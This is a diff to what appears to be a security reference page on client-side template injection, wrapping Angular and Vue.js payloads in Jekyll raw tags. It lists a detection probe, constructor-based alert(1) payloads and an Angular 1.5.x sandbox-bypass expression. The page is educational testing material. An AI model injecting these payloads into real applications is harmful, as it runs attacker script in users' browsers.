@@ -38,9 +38,11 @@ A simple arithmetic operation is the standard probe. If the application evaluate
 
 **Generic Probe:**
 
+{% raw %}
 ```txt
 Inject the string: {{ 7*7 }}
 ```
+{% endraw %}
 
 - If the application renders `49`, CSTI is present.
 - If the application renders `{{ 7*7 }}`, it is likely not vulnerable or strict contextual escaping is in place.
@@ -51,18 +53,20 @@ Angular acts on the DOM. If an attacker can inject a string containing Angular e
 
 **Payloads for Detection:**
 
+{% raw %}
 - `{{ 7*7 }}`
 - `{{ constructor.constructor('alert(1)')() }}`
+{% endraw %}
 
 In older versions of Angular (1.x), the template engine works in a sandbox. Exploitation requires breaking out of this sandbox. The complexity of the payload depends heavily on the specific version.
 
 **Example Payload (Angular 1.5.x sandbox bypass):**
 
-<-- {% raw %} -->
+{% raw %}
 ```javascript
 {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
 ```
-<-- {% endraw %} -->
+{% endraw %}
 
 #### Vue.js
 
@@ -70,13 +74,17 @@ Vue.js is also susceptible if developers use the `v-html` directive with user in
 
 **Payloads for Detection:**
 
+{% raw %}
 - `{{ 7*7 }}`
+{% endraw %}
 
 **Example Payload (Vue.js 2.x):**
 
+{% raw %}
 ```javascript
 {{_v.constructor('alert(1)')()}}
 ```
+{% endraw %}
 
 #### Alpine.js
 
